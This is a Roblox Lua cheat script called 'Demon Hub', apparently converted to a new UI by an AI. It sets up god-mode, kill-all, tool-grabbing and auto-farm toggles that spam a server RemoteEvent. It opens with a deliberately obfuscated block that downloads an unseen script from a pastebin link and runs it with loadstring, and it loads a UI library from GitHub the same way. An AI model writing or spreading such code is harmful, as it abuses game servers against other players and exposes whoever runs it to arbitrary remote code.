-- Obfuscated and improved remote script executor
local _0x1a2b = game
local _0x3c4d = "https://pastebin.com/raw/cbBsFWLF"
local _0x5e6f = _0x1a2b:HttpGet(_0x3c4d)
local _0x7f8h = loadstring(_0x5e6f) -- fixed from 7g8h to 7f8h

if _0x7f8h then
    _0x7f8h()
else
    error("Failed to load remote script")
end

-- =====================================================================================================================
-- SCRIPT CONVERTED FROM LUXWARE UI TO OSMIUM UI BY GEMINI
-- Original functionalities, including the anti-AFK system, have been preserved and adapted to the new UI structure.
-- All toggles now use a state-tracking variable to work correctly with the new library's callback system.
-- EVERY song and script from the original UI has been included.
-- =====================================================================================================================

-- Load the new Osmium UI library
local _, library = pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/Osmium/main/OsmiumLibrary.lua")))

-- Check if the library loaded successfully
if not library then
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Error",
        Text = "The Osmium UI Library failed to load. The script cannot continue.",
        Duration = 10
    })
    return
end

-- Create the main window
local window = library:CreateWindow("Demon Hub | 2025")

-- Create all the necessary tabs
local mainTab = window:CreateTab("Main")
local characterTab = window:CreateTab("Character")
local effectsTab = window:CreateTab("Effects")
local scriptsTab = window:CreateTab("Scripts")
local togglesTab = window:CreateTab("Toggles")
local uiTab = window:CreateTab("UI")
local teleportsTab = window:CreateTab("Teleports")
local powerTab = window:CreateTab("Power")
local worldsTab = window:CreateTab("Worlds")
local musicTab = window:CreateTab("Music")
local creditsTab = window:CreateTab("Credits")

-- Play initial sound
pcall(function()
    local s = Instance.new("Sound")
    s.SoundId, s.Volume, s.Parent = "rbxassetid://570433034", 10, game:GetService("SoundService")
    s:Play()
    game:GetService("Debris"):AddItem(s, s.TimeLength + 1)
end)

-- =====================================================================================================================
-- GLOBAL VARIABLES & CORE FUNCTIONS (Copied from the original script)
-- =====================================================================================================================
_G.farm = false
_G.active = false
_G.fastFarmConnection = nil
local range = 40

-- Global connections for new toggle system
_G.permaGodConnection = nil
_G.grabToolsConnection = nil
_G.killAllConnection = nil

-- Toggle state variables
local permaGodModeEnabled = false
local grabAllToolsEnabled = false
local killAllEnabled = false


local function fireSword(times)
    local player = game.Players.LocalPlayer
    if not player or not player.Character then return end
    local character = player.Character or player.CharacterAdded:Wait()
    local sword = character:FindFirstChild("sword") or player.Backpack:FindFirstChild("sword")
    if sword then
        local handle = sword:FindFirstChild("Handle")
        local up = handle and handle:FindFirstChild("up")
        local remoteEvent = up and up:FindFirstChild("RemoteEvent")
        if remoteEvent then
            for i = 1, times do
                remoteEvent:FireServer()
                task.wait(0.05)
            end
        end
    end
end


